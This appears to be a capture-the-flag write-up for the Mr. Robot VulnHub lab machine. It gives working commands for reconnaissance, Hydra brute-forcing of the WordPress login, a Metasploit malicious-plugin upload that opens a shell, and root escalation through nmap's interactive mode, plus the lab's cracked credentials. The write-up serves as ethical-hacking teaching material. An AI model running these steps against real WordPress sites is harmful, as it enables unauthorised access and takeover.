# Mr.ROBOT-VulnHub
Gear up, decrypt the code, and embrace the thrill of uncovering vulnerabilities in a controlled and safe environment. The Mr. Robot VulnHub awaits those ready to test their mettle in the ever-evolving landscape of ethical hacking.  Are you up for the challenge? 💻🚀

This Report is about hacking a virtual machine called Mr. Robot, which is based on the popular TV series of the same name. The speaker, Pablo Brusseel, is an ethical hacker who will guide you through the process of hacking the machine.
In the Report, I've used a variety of tools to hack the machine, including Nmap, Webliser, Nicto, Hydra, and a fake plugin. Able to gain root access to the machine and find the three keys that are needed to complete the Mr. Robot challenge.
Based on the show, Mr. Robot: Three keys to this virtual machine are stashed in various places. To locate all three is your objective. Every key is getting harder to locate. The VM isn't too challenging. Reverse engineering or sophisticated exploitation are not present. It is categorised as beginner-intermediate.
Let's start by downloading the MR.ROBOT machine from VulnHub Mr-Robot. With Attacking OS: Kali 2020.2 (VM) & Windows 10 (Host).
The first is a virtual machine running Kali Linux that has 25GB of HDD, 3V CPU, and 4GB of RAM. The Mr. Robot virtual machine is the second: 1. I'm utilising the 1 vCPU and 256 MB RAM default resource allocation that the ova specifies. These virtual machines are connected to a Nat network that I set up with DHCP enabled.


# Reconnaissance and Enumeration:
We have to initiates the reconnaissance phase with Nmap, meticulously scanning the virtual machine for exploitable vulnerabilities and open ports. So it uncovers a robots.txt file containing a crucial key and a dictionary file named fsociety.dic, hinting at potential entry points.(if you don't find the IP use ARP scan >> arp-scan -l )

 ```bash
nmap -sV -sC 10.0.2.6(MR.ROBOT_IP)
```


# Information Gathering:
An nmap scan of the local subnet reveals four devices—including the Kali virtual machine—on the network. Two open ports are also displayed by the nmap scan: 443 for https and 80 for http. For SSH, port number 22, is displayed as closed. This removes the possibility of a simple way to compromise the target. It's possible that the target is hosting a website if the ports are open.


After trying out a Nikto scan or using nmap with -script switch and the script as http-enum. Right off the bat, the result shows that the website runs on wordpress. It also shows the version of wordpress. On trying some of the obviously interesting urls, 
I find the wordpress login page …

```bash
nikto –host 10.0.2.6
```

Try to find any hidden directories in the bowers or you can use the dirbuster command .
Use 
```bash
dirb http://10.0.2.6
```

We suspected that the webserver has robots.txt file. Check it in the browser and do the next steps to get the first flag.
download the files 
use 
```bash
wget http://10.0.2.6/fsocity.dic
```

The extension makes it quite evident that the file is most likely a dictionary . However, we'll execute the head command on it to view a portion of its contents just to be sure.
Use 
```bash
head fsocity.dic
```
Word count in the original file is 858160. How are we aware? employing the flag -l (line) and the wc command (word count)
Use 
``bash
wc -l fsocity
```

Using the following command, we can scrolled through the wordlist to see it’s contents.
Use 
```bash
cat fsocity.dic | more
```
Use the next command to find unique words per line 

```bash
sort fsocity.dic| uniq | wc -l
```

After sorting the words save it to new file 

```bash
sort fsocity.dic | uniq > fsocity_filtered.dic
```

After filtering it we are left with 11451 words from 85816

# Exploitation and Privilege Escalation:

Now try doing some random entries in the browser in the user name and password section.
Learn from what output you get,


It shows that the random user name and passwords you entered is invalid. Its specifically saying “INVALID USERNAME” So we have the list of users name and we can check it in the browser by trying  brute forcing it in the browser. so we're going to use two tools  for that the first one is going to be  burp suite  which is basically going to act as a  tool to  see what kind of requests are being sent  over to the web server. 

For burpsuit i used foxy poxy and this are its settings, so i'm going to go  ahead and set up the proxy i'm going to  go to options and set hostname where Burp is listening on the correct  interface. we want to intercept responses  as well and we don't really care about websocket  messages so can keep the setting off by unchecking the box. Now in order to run our traffic through  burp we need to go ahead and  set up the proxy i'm using foxy proxy  for this i actually have this  setup already. If you want to go to  options  and burp suite this is how i've set it  up so i'm basically referring to my  own computer on port 8080  which is also where burp is listening.

Now, its time use hydra to hack or enumerate the username where we are going to use the information obtained from burp intercept. I used hydra and the file fsocity_filtered.dic together with a one-word password to brute-force the username. The wp-login page's source can be utilised to determine the parameter that is used. "log" is the username and "pwd" is the password fields. "Invalid" is the response I tested against.

```bash
hydra -L fsocity_filtered.dic -p something 10.0.2.6 http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username”
```


The scan is not fully  finished but we see that we  already have a user called elliott and if we go to my wordpress and i type in elliott, instead you're  going to see that we get  a little bit of a different error  message. So my burp is still holding this up  the password field is empty  so now we have the password you entered  for username elliot is incorrect  which is actually a good thing  because now we know that elliott is a  valid user  now i'm going to check again with hydra  if  the password is also in that file so  we're going to  adjust our command a little bit so it's  going to fail on  is incorrect and give us the rest  as a valid entry.

Elliot appears to be our username; let's try this again, this time making sure we have the password. Use the new hydra command:
```bash
hydra -l elliot -P fsocity_filtered.dic 10.0.2.6 http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect”
```



Great! We've successfully obtained the password ER28–0652. Now, we can use these credentials to log in.

Upon exploring, it appears that the WordPress installation is inactive. There are no pages, no posts, and only one additional user, mich05654, who isn't an administrator—so we can disregard this user.

Our next step is to utilize the WordPress admin privileges to gain access to the webserver. To achieve this, we'll employ Metasploit.

Use :-
```bash
msfconsole
```

```bash
search wordpress shell
```

``` bash
exploit/unix/webapp/wp_admin_shell_upload or use 1
```

We’re going to use a Metasploit Module that will create a malicious plugin and upload it to the WordPress installation, giving us a meterpreter shell back.

Use 

```bash
show options
```



Use:- 

msf6 exploit(unix/webapp/wp_admin_shell_upload) >  

```bash 
set PASSWORD ER28-0652
```
PASSWORD => ER28-0652
msf6 exploit(unix/webapp/wp_admin_shell_upload) > 

```bash 
set USERNAME elliot
```
USERNAME => elliot
msf6 exploit(unix/webapp/wp_admin_shell_upload) >
```bash
set RHOST 10.0.2.6
```
RHOST => 10.0.2.6
msf6 exploit(unix/webapp/wp_admin_shell_upload) > 
```bash
set WPCHECK false
```
WPCHECK => false
msf6 exploit(unix/webapp/wp_admin_shell_upload) > 
```bash
exploit
```




Now the shell that we have right now is  still limited  so now escape the shell and  basically spawn a better one and i'm  going to do that with python so i'm  going to say python  -c and i'm going to write some  python code to  import pty  then pty spawn  and then the shell that we want to spawn  which is going to be bin  bash and close all the brackets  so we now have imported  in shell.
 
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```



If we now go to the user’s desktop at /home/robot, we can see the second key there, as well as a file called password.raw-md5



Now we got the hash from the raw-md5 file for the account “robot”. 
## Robot:c3fcd3d76192e4007dfb496cca67e13b

The md5 hash can be cracked by hashcat but since its is been hashed we can check it online on Crackstation.


Great !  we got the second flag.
Let's use Python to spawn a bash shell using our meterpreter shell. After obtaining our bash shell, we can log in as a robot to increase our level of access.
We’ll be using the following command to check for binaries with the SUID bit set:
```bash
find / -perm -4000 -type f 2>/dev/null
```
With this command, we can check for binaries that can run commands as it’s owner. In our case, we found the following files:




In order to locate the third key, I looked for a file whose name started with "key-3-." The root directory contains the third key file. The third and last key to the box can be obtained by catalysing the file. 
Use 
```bash
nmap –interactive
```

```bash
!whoami
```

```bash
!ls /root
```

```bash
!cat /root/key-3-of-3.txt'
```



Indeed, the third and last key is now in our possession!

After finding a WordPress installation, we were able to compromise the Mr. Robot virtual machine (VM), upload a malicious plugin, and escalate privileges using nmap to obtain root authorization.

